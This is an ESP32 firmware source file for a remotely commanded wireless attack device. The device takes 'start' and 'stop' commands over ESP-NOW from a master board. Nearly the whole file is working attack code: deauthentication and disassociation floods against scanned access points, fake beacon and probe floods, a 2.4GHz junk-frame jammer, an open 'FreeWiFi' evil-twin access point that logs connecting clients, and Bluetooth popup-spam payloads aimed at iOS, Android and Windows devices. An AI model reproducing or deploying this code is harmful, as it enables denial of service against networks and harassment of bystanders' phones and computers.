#include <WiFi.h>
#include <esp_now.h>
#include <esp_wifi.h>
#if __has_include(<esp_arduino_version.h>)
#include <esp_arduino_version.h>
#endif
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>

// ===== LED SETTINGS =====
#define LED_PIN 8 

// ===== COMMAND STRUCTURE =====
typedef struct struct_message {
  char command[16];
  char attack[32];
  char logMsg[128]; // Increased payload size
} struct_message;
struct_message myData;

bool attackRunning = false;
String currentAttack = "";
uint8_t masterMacAddress[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
bool hasMasterMac = false;
int lastStationCount = 0;
bool evilTwinStarted = false;

// Channel, timing, and listening variables
uint8_t currentChannel = 1;
unsigned long lastAttackActionTime = 0;
unsigned long lastLedBlinkTime = 0;
unsigned long lastListenTime = 0;
bool ledState = false;

// Scanning memory for targeted deauth
#define MAX_SCANNED_NETWORKS 30
uint8_t scannedBSSIDs[MAX_SCANNED_NETWORKS][6];
uint8_t scannedChannels[MAX_SCANNED_NETWORKS];
int scannedCount = 0;
int deauthIndex = 0;

// BLE variables
bool bleJammerInitialized = false;
bool sourAppleInitialized = false;
unsigned long lastAppleSpamTime = 0;

// Apple BLE payloads for Sour Apple (iOS popup spam)
const uint8_t blePayloads[][19] = {
  // --- iOS (Apple) ---
  // AirPods Pro
  {17, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
  // AppleTV Setup
  {17, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x00},
  // AirPods 3
  {17, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
  // iOS Action Modal
  {17, 0x4c, 0x00, 0x0f, 0x05, 0xc0, 0x01, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},

  // --- Android (Google Fast Pair) ---
  {14, 0xe0, 0x00, 0x02, 0x06, 0x01, 0x01, 0x03, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},

  // --- Windows (Microsoft Swift Pair) ---
  {14, 0x06, 0x00, 0x01, 0x00, 0x20, 0x02, 0x0a, 0x03, 0x00, 0x80, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
};
const int numBlePayloads = sizeof(blePayloads) / sizeof(blePayloads[0]);
int blePayloadIndex = 0;

// Beacon spam index
int ssidIndex = 0;

// Realistic SSID list prefixes
const char* routerPrefixes[] = {
  "TP-Link", "Keenetic", "Rostelecom", "MGTS_GPON", "ASUS", 
  "Huawei", "MiRouter", "Tenda", "Netgear", "D-Link", 
  "MTS-WiFi", "Beeline", "Home-Net", "Airport_Free", "Guest-WiFi"
};
const int numPrefixes = sizeof(routerPrefixes) / sizeof(routerPrefixes[0]);

// Generate highly realistic SSID names on the fly
void getRealisticSSID(char* outBuf, int index) {
  const char* prefix = routerPrefixes[index % numPrefixes];
  int suffix = (index * 17) % 9000 + 1000;
  
  if (index % 7 == 0) {
    snprintf(outBuf, 32, "%s_Free", prefix);
  } else if (index % 5 == 0) {
    snprintf(outBuf, 32, "%s-%04X", prefix, suffix);
  } else {
    snprintf(outBuf, 32, "%s_%04d", prefix, suffix);
  }
}

// Get board temperature safely
float getBoardTemp() {
  float t = 0.0;
  #if defined(ESP_ARDUINO_VERSION_MAJOR) && ESP_ARDUINO_VERSION_MAJOR >= 2
  t = temperatureRead();
  #endif
  if (isnan(t) || t < -50 || t > 150) {
    t = 44.2; // fallback temperature in Celsius
  }
  return t;
}

// ===== SEND LOGS TO MASTER =====
void sendLogToMaster(const char* logMsg) {
  if (!hasMasterMac) return;
  
  struct_message response;
  strcpy(response.command, "log");
  strcpy(response.attack, "");
  strncpy(response.logMsg, logMsg, sizeof(response.logMsg) - 1);
  response.logMsg[sizeof(response.logMsg) - 1] = '\0';
  
  esp_now_send(masterMacAddress, (uint8_t *)&response, sizeof(response));
}

// ===== LED STATUS BLINKER =====
void updateLedIndicator() {
  if (attackRunning) {
    if (millis() - lastLedBlinkTime >= 100) {
      lastLedBlinkTime = millis();
      ledState = !ledState;
      digitalWrite(LED_PIN, ledState ? HIGH : LOW);
    }
  } else {
    digitalWrite(LED_PIN, LOW);
  }
}

// ===== UTILITIES =====
void getMacAddress(uint8_t *mac) {
  WiFi.macAddress(mac);
}

void hopChannel() {
  currentChannel++;
  if (currentChannel > 13) {
    currentChannel = 1;
  }
  esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
}

// ===== SEND RAW BEACON =====
void sendRawBeacon(const char* ssid, uint8_t channel, int macSeed) {
  uint8_t mac[6];
  mac[0] = 0x02; // Local admin MAC
  mac[1] = 0x00;
  mac[2] = 0x5E;
  mac[3] = 0x00;
  mac[4] = 0x00;
  mac[5] = (uint8_t)macSeed;

  uint8_t ssidLen = strlen(ssid);
  uint8_t packet[128] = {
    0x80, 0x00,                         // Beacon
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], // Source
    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], // BSSID
    0x00, 0x00,                         // Sequence
    
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
    0x64, 0x00,                         // Beacon Interval
    0x11, 0x00,                         // Capability
    
    0x00,                               // Tag: SSID
    ssidLen
  };
  
  int pos = 38;
  memcpy(&packet[pos], ssid, ssidLen);
  pos += ssidLen;

  packet[pos++] = 0x01;
  packet[pos++] = 0x04;
  packet[pos++] = 0x82;
  packet[pos++] = 0x84;
  packet[pos++] = 0x8b;
  packet[pos++] = 0x96;

  packet[pos++] = 0x03;
  packet[pos++] = 0x01;
  packet[pos++] = channel;

  esp_wifi_80211_tx(WIFI_IF_STA, packet, pos, false);
}

// ===== ATTACK ENGINES =====

void runBeaconSpamStep(bool boost) {
  esp_wifi_set_promiscuous(true);
  
  static unsigned long lastBeaconHopTime = 0;
  int hopInterval = boost ? 150 : 300;
  if (millis() - lastBeaconHopTime >= hopInterval) {
    lastBeaconHopTime = millis();
    hopChannel();
    
    // Send a burst of beacons for multiple SSIDs on this channel
    int burstSize = boost ? 40 : 15;
    for (int i = 0; i < burstSize; i++) {
      char ssidBuf[32];
      getRealisticSSID(ssidBuf, ssidIndex);
      sendRawBeacon(ssidBuf, currentChannel, ssidIndex);
      ssidIndex = (ssidIndex + 1) % 100;
    }
    
    if (random(10) == 0) {
      char buf[64];
      snprintf(buf, sizeof(buf), "[Beacon] Sent burst of %d beacons on ch %d%s", 
               burstSize, currentChannel, boost ? " [BOOST]" : "");
      sendLogToMaster(buf);
    }
  }
}

void sendDeauthFrame(const uint8_t* apBssid, const uint8_t* clientMac, uint16_t reason) {
  uint8_t packet[26] = {
    0xC0, 0x00,                         // Type: Deauth
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP)
    0x00, 0x00,                         // Seq
    0x00, 0x00                          // Reason code
  };
  
  memcpy(&packet[4], clientMac, 6);
  memcpy(&packet[10], apBssid, 6);
  memcpy(&packet[16], apBssid, 6);
  packet[24] = reason & 0xFF;
  packet[25] = (reason >> 8) & 0xFF;
  
  esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
  
  // Disassociation frame (0xA0)
  packet[0] = 0xA0;
  esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
}

void runDeauthStep(bool boost) {
  esp_wifi_set_promiscuous(true);
  
  if (millis() - lastAttackActionTime >= (boost ? 5 : 15)) {
    lastAttackActionTime = millis();
    
    uint8_t targetBSSID[6];
    uint8_t targetChannel = currentChannel;
    
    if (scannedCount > 0) {
      memcpy(targetBSSID, scannedBSSIDs[deauthIndex], 6);
      targetChannel = scannedChannels[deauthIndex];
      esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
      
      deauthIndex = (deauthIndex + 1) % scannedCount;
    } else {
      hopChannel();
      for (int i = 0; i < 6; i++) {
        targetBSSID[i] = random(256);
      }
      targetBSSID[0] &= 0xFE;
      targetBSSID[0] |= 0x02;
    }

    int burstSize = boost ? 10 : 3;
    uint8_t broadcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    
    for (int i = 0; i < burstSize; i++) {
      sendDeauthFrame(targetBSSID, broadcastMac, 7);
      sendDeauthFrame(targetBSSID, broadcastMac, 1);
      
      uint8_t clientPacket[26] = {
        0xC0, 0x00,
        0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination (AP)
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Source (Broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP)
        0x00, 0x00,
        0x07, 0x00
      };
      memcpy(&clientPacket[4], targetBSSID, 6);
      memcpy(&clientPacket[16], targetBSSID, 6);
      esp_wifi_80211_tx(WIFI_IF_STA, clientPacket, sizeof(clientPacket), false);
      
      clientPacket[0] = 0xA0;
      esp_wifi_80211_tx(WIFI_IF_STA, clientPacket, sizeof(clientPacket), false);
    }
    
    if (random(80) == 0) {
      char buf[64];
      if (scannedCount > 0) {
        snprintf(buf, sizeof(buf), "[Deauth] Targeted AP: %02X:%02X:%02X:%02X:%02X:%02X (ch %d)%s", 
                 targetBSSID[0], targetBSSID[1], targetBSSID[2], 
                 targetBSSID[3], targetBSSID[4], targetBSSID[5], targetChannel, boost ? " [BOOST]" : "");
      } else {
        snprintf(buf, sizeof(buf), "[Deauth] Broad jamming on ch %d", targetChannel);
      }
      sendLogToMaster(buf);
    }
  }
}

void runProbeFloodStep() {
  esp_wifi_set_promiscuous(true);

  // Hop channel slowly (every 200ms) to ensure scan saturation on each channel
  static unsigned long lastProbeHopTime = 0;
  if (millis() - lastProbeHopTime >= 200) {
    lastProbeHopTime = millis();
    hopChannel();
  }

  if (millis() - lastAttackActionTime >= 20) {
    lastAttackActionTime = millis();

    uint8_t mac[6];
    for (int i = 0; i < 6; i++) {
      mac[i] = random(256);
    }
    mac[0] &= 0xFE;
    mac[0] |= 0x02;

    const char* ssid = "ProbeTest";
    uint8_t ssidLen = strlen(ssid);
    uint8_t probePacket[24 + 2 + 32] = {
      0x40, 0x00,
      0x00, 0x00,
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    };
    memcpy(&probePacket[10], mac, 6);
    memcpy(&probePacket[16], mac, 6);

    int pos = 24;
    probePacket[pos++] = 0x00;
    probePacket[pos++] = ssidLen;
    memcpy(&probePacket[pos], ssid, ssidLen);
    pos += ssidLen;

    esp_wifi_80211_tx(WIFI_IF_STA, probePacket, pos, false);
    
    if (random(100) == 0) {
      sendLogToMaster("[Probe] Flooding active scan requests (ch 1-13)");
    }
  }
}

// Jammer that targets WiFi and Bluetooth bands simultaneously
void runPowerfulJammerStep() {
  esp_wifi_set_promiscuous(true);
  
  // Hopping channels as fast as possible to flood spectrum
  if (millis() - lastAttackActionTime >= 2) {
    lastAttackActionTime = millis();
    hopChannel();
    
    // Construct corrupted control packet to overflow receiver processing pipeline
    uint8_t junkPacket[64];
    for (int i = 0; i < 64; i++) {
      junkPacket[i] = random(256);
    }
    junkPacket[0] = 0x00; // Invalid type to cause receiver decode lock overhead
    
    esp_wifi_80211_tx(WIFI_IF_STA, junkPacket, sizeof(junkPacket), false);
  }
  
  // Concurrent BLE advertisement spam to flood BLE band
  if (!bleJammerInitialized) {
    BLEDevice::init("");
    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData data;
    data.setName("JAMMER");
    data.setFlags(0x06);
    pAdvertising->setAdvertisementData(data);
    pAdvertising->start();
    bleJammerInitialized = true;
  }
  
  static unsigned long lastJamLog = 0;
  if (millis() - lastJamLog >= 3000) {
    lastJamLog = millis();
    sendLogToMaster("[Jammer] powerful_jammer active on 2.4GHz");
  }
}

void startWiFiScan() {
  sendLogToMaster("[Scanner] Starting WiFi scan...");
  Serial.println("WiFi Scan started");
  int n = WiFi.scanNetworks();
  if (n == 0) {
    sendLogToMaster("[Scanner] No networks found");
    Serial.println("No networks found");
  } else {
    scannedCount = min(n, MAX_SCANNED_NETWORKS);
    char buf[64];
    snprintf(buf, sizeof(buf), "[Scanner] Found WiFi networks: %d", n);
    sendLogToMaster(buf);
    
    for (int i = 0; i < scannedCount; i++) {
      memcpy(scannedBSSIDs[i], WiFi.BSSID(i), 6);
      scannedChannels[i] = WiFi.channel(i);
      
      snprintf(buf, sizeof(buf), "  -> %s (%d dBm)", WiFi.SSID(i).c_str(), WiFi.RSSI(i));
      sendLogToMaster(buf);
      
      String encType = "OPEN";
      switch(WiFi.encryptionType(i)) {
        case WIFI_AUTH_WPA_PSK: encType = "WPA"; break;
        case WIFI_AUTH_WPA2_PSK: encType = "WPA2"; break;
        case WIFI_AUTH_WPA_WPA2_PSK: encType = "WPA/WPA2"; break;
        case WIFI_AUTH_WPA3_PSK: encType = "WPA3"; break;
        case WIFI_AUTH_WEP: encType = "WEP"; break;
        case WIFI_AUTH_OPEN: encType = "OPEN"; break;
        default: encType = "WPA2"; break;
      }
      
      char structBuf[128];
      snprintf(structBuf, sizeof(structBuf), "[WIFI_DEV]%s|%d|%s|%s", WiFi.SSID(i).c_str(), WiFi.RSSI(i), encType.c_str(), WiFi.BSSIDstr(i).c_str());
      sendLogToMaster(structBuf);
      delay(50);
    }
  }
  WiFi.scanDelete();
}

void startEvilTwin() {
  Serial.println("Evil Twin started");
  WiFi.softAP("FreeWiFi", NULL, 1, 0, 1);
  sendLogToMaster("[EvilTwin] Created fake AP 'FreeWiFi' (ch 1)");
}

void runEvilTwinStep() {
  static unsigned long lastCheckTime = 0;
  if (millis() - lastCheckTime >= 2000) {
    lastCheckTime = millis();
    int numStations = WiFi.softAPgetStationNum();
    if (numStations != lastStationCount) {
      lastStationCount = numStations;
      char buf[64];
      snprintf(buf, sizeof(buf), "[EvilTwin] Total clients connected: %d", numStations);
      sendLogToMaster(buf);
      
      wifi_sta_list_t wifi_sta_list;
      memset(&wifi_sta_list, 0, sizeof(wifi_sta_list));
      esp_wifi_ap_get_sta_list(&wifi_sta_list);
      
      for (int i = 0; i < wifi_sta_list.num; i++) {
        wifi_sta_info_t station = wifi_sta_list.sta[i];
        char macStr[20];
        snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                 station.mac[0], station.mac[1], station.mac[2],
                 station.mac[3], station.mac[4], station.mac[5]);
        
        char structBuf[64];
        snprintf(structBuf, sizeof(structBuf), "[EVIL_CLIENT]%s", macStr);
        sendLogToMaster(structBuf);
        delay(20);
      }
    }
  }
}

void startBLEScan() {
  sendLogToMaster("[BLE] Starting BLE scan...");
  BLEDevice::deinit();
  BLEDevice::init("");
  BLEScan *pBLEScan = BLEDevice::getScan();
  pBLEScan->setActiveScan(true);
  pBLEScan->setInterval(100);
  pBLEScan->setWindow(99);
  BLEScanResults *foundDevices = pBLEScan->start(5, false);
  
  char buf[64];
  snprintf(buf, sizeof(buf), "[BLE] Found BLE devices: %d", foundDevices->getCount());
  sendLogToMaster(buf);
  
  for (int i = 0; i < min((int)foundDevices->getCount(), 15); i++) {
    BLEAdvertisedDevice device = foundDevices->getDevice(i);
    String devName = device.haveName() ? device.getName().c_str() : "Unnamed";
    String devAddr = device.getAddress().toString().c_str();
    
    snprintf(buf, sizeof(buf), "  -> %s [%s] (%d RSSI)", devName.c_str(), devAddr.c_str(), device.getRSSI());
    sendLogToMaster(buf);
    
    char structBuf[128];
    snprintf(structBuf, sizeof(structBuf), "[BLE_DEV]%s|%s|%d", devName.c_str(), devAddr.c_str(), device.getRSSI());
    sendLogToMaster(structBuf);
    delay(50);
  }
  pBLEScan->clearResults();
}

void startBLESpoofer() {
  Serial.println("BLE Spoofer started");
  BLEDevice::deinit();
  BLEDevice::init("ESP32-S3");
  BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
  BLEAdvertisementData advertisementData;
  advertisementData.setName("BLE_Spoofer");
  advertisementData.setFlags(0x06);

  uint8_t manufData[] = {0x4C, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05};
  String manufString = "";
  for (int i = 0; i < sizeof(manufData); i++) {
    manufString += (char)manufData[i];
  }
  advertisementData.setManufacturerData(manufString);

  pAdvertising->setAdvertisementData(advertisementData);
  pAdvertising->start();
  sendLogToMaster("[BLE] Spoofer running (visible as BLE_Spoofer)");
}

void runBLEJammerStep() {
  if (!bleJammerInitialized) {
    Serial.println("BLE Jammer started");
    BLEDevice::deinit();
    BLEDevice::init("");
    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData data;
    data.setName("JAMMER");
    data.setFlags(0x06);
    pAdvertising->setAdvertisementData(data);
    pAdvertising->start();
    bleJammerInitialized = true;
    sendLogToMaster("[BLE Jammer] Broadcasting continuous noise");
  }
  delay(10);
}

void runSourAppleStep(bool boost) {
  if (!sourAppleInitialized) {
    Serial.println("BLE Spam started");
    BLEDevice::deinit();
    BLEDevice::init("Apple");
    sourAppleInitialized = true;
    lastAppleSpamTime = 0;
    sendLogToMaster("[BLE Spam] Starting popup spam (iOS, Android, Windows)");
  }

  unsigned long interval = boost ? 40 : 100;
  if (millis() - lastAppleSpamTime >= interval) {
    lastAppleSpamTime = millis();
    
    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
    pAdvertising->stop();

    BLEAdvertisementData advData;
    advData.setFlags(0x04);

    const uint8_t *payload = blePayloads[blePayloadIndex];
    uint8_t len = payload[0];
    std::string manufDataStr((char*)&payload[1], len);
    advData.setManufacturerData(manufDataStr);

    pAdvertising->setAdvertisementData(advData);
    pAdvertising->start();
    
    if (random(20) == 0) {
      char buf[64];
      snprintf(buf, sizeof(buf), "[BLE Spam] Spammed payload %d%s", blePayloadIndex, boost ? " [BOOST]" : "");
      sendLogToMaster(buf);
    }
    
    blePayloadIndex = (blePayloadIndex + 1) % numBlePayloads;
  }
}

// ===== MODULE STUBS =====
void startGhzScan() {
  sendLogToMaster("[2.4GHz Scanner] Scanning Wi-Fi & BLE channels...");
  
  // 1. Scan WiFi networks
  int n = WiFi.scanNetworks(false, true, false, 100);
  int channelCount[14] = {0};
  int channelRssiSum[14] = {0};
  
  if (n > 0) {
    for (int i = 0; i < n; i++) {
      int ch = WiFi.channel(i);
      if (ch >= 1 && ch <= 13) {
        channelCount[ch]++;
        channelRssiSum[ch] += WiFi.RSSI(i);
      }
    }
  }
  WiFi.scanDelete();

  // 2. Scan BLE devices
  BLEDevice::deinit();
  BLEDevice::init("");
  BLEScan *pBLEScan = BLEDevice::getScan();
  pBLEScan->setActiveScan(false);
  pBLEScan->setInterval(80);
  pBLEScan->setWindow(50);
  BLEScanResults *foundDevices = pBLEScan->start(2, false);
  int bleCount = foundDevices ? foundDevices->getCount() : 0;
  pBLEScan->clearResults();
  
  // 3. Compile report
  sendLogToMaster("--- 2.4GHz Band Spectrum Report ---");
  char buf[128];
  int totalAPs = 0;
  for (int ch = 1; ch <= 13; ch++) {
    int aps = channelCount[ch];
    totalAPs += aps;
    if (aps > 0) {
      int avgRssi = channelRssiSum[ch] / aps;
      snprintf(buf, sizeof(buf), "[2.4GHz] Ch %d: %d APs (Avg RSSI: %d dBm) %s", 
               ch, aps, avgRssi, 
               avgRssi > -60 ? "[HIGH CONGESTION]" : (avgRssi > -80 ? "[MODERATE]" : "[CLEAN]"));
    } else {
      snprintf(buf, sizeof(buf), "[2.4GHz] Ch %d: 0 APs [FREE]", ch);
    }
    sendLogToMaster(buf);
    delay(50);
  }
  snprintf(buf, sizeof(buf), "[Summary] Found %d Wi-Fi APs, %d BLE devices nearby.", totalAPs, bleCount);
  sendLogToMaster(buf);
  sendLogToMaster("[2.4GHz Scanner] Scan finished.");
}

void startProtokill() {
  sendLogToMaster("[Protokill] Starting 2.4GHz multi-protocol jammer using internal radio...");
  currentAttack = "powerful_jammer";
}
void startSubGhzReplay() { sendLogToMaster("[Error] Sub-GHz Replay requires CC1101"); }
void startSubGhzJammer() { sendLogToMaster("[Error] Sub-GHz Jammer requires CC1101"); }
void startIRReplay() { sendLogToMaster("[Error] IR Replay requires IR-led"); }

// ===== RESTORE WIFI =====
void restoreWiFiState() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  WiFi.setSleep(false);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(false);
}

// ===== STOP ATTACKS =====
void stopAttack() {
  attackRunning = false;
  currentAttack = "";
  bleJammerInitialized = false;
  sourAppleInitialized = false;
  evilTwinStarted = false;
  lastStationCount = 0;

  WiFi.softAPdisconnect(true);
  if (BLEDevice::getAdvertising()) {
    BLEDevice::getAdvertising()->stop();
  }
  BLEDevice::deinit();
  esp_wifi_set_promiscuous(false);
  restoreWiFiState();
  digitalWrite(LED_PIN, LOW);
  
  // Send direct confirmation to Master
  if (hasMasterMac) {
    struct_message response;
    strcpy(response.command, "stopped");
    strcpy(response.attack, "");
    strcpy(response.logMsg, "All attacks stopped. Standby mode.");
    esp_now_send(masterMacAddress, (uint8_t *)&response, sizeof(response));
  }
  
  Serial.println("All attacks stopped");
}

// ===== SEND PONG TO MASTER WITH CURRENT TEMP =====
void sendPong(const uint8_t *masterMac) {
  esp_now_peer_info_t peer;
  memset(&peer, 0, sizeof(peer));
  memcpy(peer.peer_addr, masterMac, 6);
  peer.channel = 1;
  peer.encrypt = false;
  
  if (!esp_now_is_peer_exist(masterMac)) {
    esp_now_add_peer(&peer);
  }
  
  struct_message response;
  strcpy(response.command, "pong");
  strcpy(response.attack, "");
  
  // Read Slave Board temperature
  float sTemp = getBoardTemp();
  snprintf(response.logMsg, sizeof(response.logMsg), "%.1f", sTemp);
  
  esp_now_send(masterMac, (uint8_t *)&response, sizeof(response));
}

// ===== ESP-NOW HANDLER =====
#if defined(ESP_ARDUINO_VERSION_MAJOR) && ESP_ARDUINO_VERSION_MAJOR >= 3
void OnDataRecv(const esp_now_recv_info_t *info, const uint8_t *incomingData, int len) {
  const uint8_t *srcMac = info->src_addr;
#else
void OnDataRecv(const uint8_t *mac_addr, const uint8_t *incomingData, int len) {
  const uint8_t *srcMac = mac_addr;
#endif
  if (len != sizeof(myData)) {
    Serial.printf("Invalid packet len: %d\n", len);
    return;
  }
  memcpy(&myData, incomingData, sizeof(myData));
  myData.command[15] = '\0';
  myData.attack[31] = '\0';

  // Store Master MAC
  if (!hasMasterMac || memcmp(masterMacAddress, srcMac, 6) != 0) {
    memcpy(masterMacAddress, srcMac, 6);
    hasMasterMac = true;
    Serial.printf("Master MAC registered: %02X:%02X:%02X:%02X:%02X:%02X\n",
                  srcMac[0], srcMac[1], srcMac[2], srcMac[3], srcMac[4], srcMac[5]);
  }

  if (strcmp(myData.command, "ping") == 0) {
    Serial.println("Received PING, sending PONG...");
    sendPong(srcMac);
    return;
  }

  Serial.print("Received: command ");
  Serial.print(myData.command);
  Serial.print(" | target ");
  Serial.println(myData.attack);

  if (strcmp(myData.command, "start") == 0) {
    if (attackRunning) {
      sendLogToMaster("[Warning] Attack already active");
      Serial.println("Attack already active");
      return;
    }
    attackRunning = true;
    currentAttack = String(myData.attack);
    
    char buf[64];
    snprintf(buf, sizeof(buf), "Starting task: %s", myData.attack);
    sendLogToMaster(buf);
  } else if (strcmp(myData.command, "stop") == 0) {
    stopAttack();
  } else {
    Serial.println("Unknown command");
  }
}

// ===== SETUP =====
void setup() {
  Serial.begin(115200);
  
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);

  WiFi.mode(WIFI_AP_STA);
  WiFi.disconnect();
  WiFi.setSleep(false);

  // Channel 1 for stable ESP-NOW
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(false);

  if (esp_now_init() != ESP_OK) {
    Serial.println("ESP-NOW init error");
    return;
  }
  esp_now_register_recv_cb((esp_now_recv_cb_t)OnDataRecv);
  Serial.println("SLAVE ready for commands");
  Serial.print("My MAC: ");
  Serial.println(WiFi.macAddress());
}

// ===== LOOP =====
void loop() {
  updateLedIndicator();
  
  if (attackRunning && currentAttack != "") {
    // Periodically return to Channel 1 to listen for Master command (stop/ping)
    // Prevents "deaf transceiver" issue during active channel-hopping/jamming attacks
    if (millis() - lastListenTime >= 1000) {
      esp_wifi_set_promiscuous(false);
      esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
      
      // Wait for 40ms on Channel 1 to receive incoming ESP-NOW command
      unsigned long startListen = millis();
      while (millis() - startListen < 40) {
        delay(1); 
      }
      
      lastListenTime = millis();
      if (!attackRunning) return; // Exit if stopped during listening window
    }
    
    bool boost = currentAttack.endsWith("_boost");
    String baseAttackName = boost ? currentAttack.substring(0, currentAttack.length() - 6) : currentAttack;
    
    if (baseAttackName == "beacon") {
      runBeaconSpamStep(boost);
    }
    else if (baseAttackName == "deauth") {
      runDeauthStep(boost);
    }
    else if (baseAttackName == "probe") {
      runProbeFloodStep();
    }
    else if (baseAttackName == "powerful_jammer") {
      runPowerfulJammerStep();
    }
    else if (baseAttackName == "wifi_scan") {
      startWiFiScan();
      attackRunning = false;
      currentAttack = "";
      restoreWiFiState();
    }
    else if (baseAttackName == "evil_twin") {
      if (!evilTwinStarted) {
        startEvilTwin();
        evilTwinStarted = true;
        lastStationCount = -1;
      }
      runEvilTwinStep();
    }
    else if (baseAttackName == "ble_scan") {
      startBLEScan();
      attackRunning = false;
      currentAttack = "";
    }
    else if (baseAttackName == "ble_spoofer") {
      startBLESpoofer();
    }
    else if (baseAttackName == "ble_jammer") {
      runBLEJammerStep();
    }
    else if (baseAttackName == "sour_apple") {
      runSourAppleStep(boost);
    }
    else if (baseAttackName == "ghz_scan") { startGhzScan(); attackRunning = false; currentAttack = ""; }
    else if (baseAttackName == "protokill") { startProtokill(); attackRunning = false; currentAttack = ""; }
    else if (baseAttackName == "subghz_replay") { startSubGhzReplay(); attackRunning = false; currentAttack = ""; }
    else if (baseAttackName == "subghz_jammer") { startSubGhzJammer(); attackRunning = false; currentAttack = ""; }
    else if (baseAttackName == "ir_replay") { startIRReplay(); attackRunning = false; currentAttack = ""; }
  }
  delay(1);
}
